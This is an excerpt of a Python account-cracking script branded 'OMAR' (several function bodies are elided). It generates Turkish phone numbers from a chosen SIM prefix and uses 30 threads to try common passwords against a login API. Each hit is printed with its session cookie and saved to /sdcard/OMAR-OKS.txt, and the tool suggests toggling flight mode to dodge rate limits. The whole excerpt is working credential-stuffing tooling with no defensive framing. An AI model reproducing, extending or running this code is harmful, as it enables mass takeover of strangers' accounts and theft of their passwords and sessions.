...
def main():
    ...
    print(f'\033[1;35m║[✓]    [1] RANDOM TURKISH                  [✓]║ ')
    print(f'\033[1;35m║[✓]    [2] EXIT TOOLS                      [✓]║ ');linex()
    t=input('\033[1;35m [➤] YOUR CHOICE : ')
    if t in ["1","01"]:
        bhoot()    
    if t in ["2","02"]:
        os.system('exit')
...
def bhoot():
    ...
    os.system("clear")
    print(logo)
    print(f'\033[1;35m[✧] SIM CODE : 0534,0546,0538,05553 ')
    code = input(f'\033[1;35m[➤] YOUR CHOICE : ');linex()
    os.system("clear")
    print(logo)
    print(f'\033[1;35m[✧] LIMIT EXAMPLE : 5000,10000,50000 ')
    limit = int(input('\033[1;35m[➤] YOUR CHOICE : '));linex()
    os.system("clear")
    print(logo)
    ...
    with ThreadPool(max_workers=30) as TANIM:
        tl = str(len(user))
        print('\033[1;35m║USE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDS║');linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'turkiye','istanbul','i love you','sadiya','ali123','ahmet123','123456','mehmet123','12345678','turk123','kurt123','muhammet','konya123','izmir123','turk1234','800900']
            ids = code+love
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;35m[➤] OMAR~511  \033[1;35m[{loop}]  \033[1;35mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[OMAR-AFG] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/OMAR-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
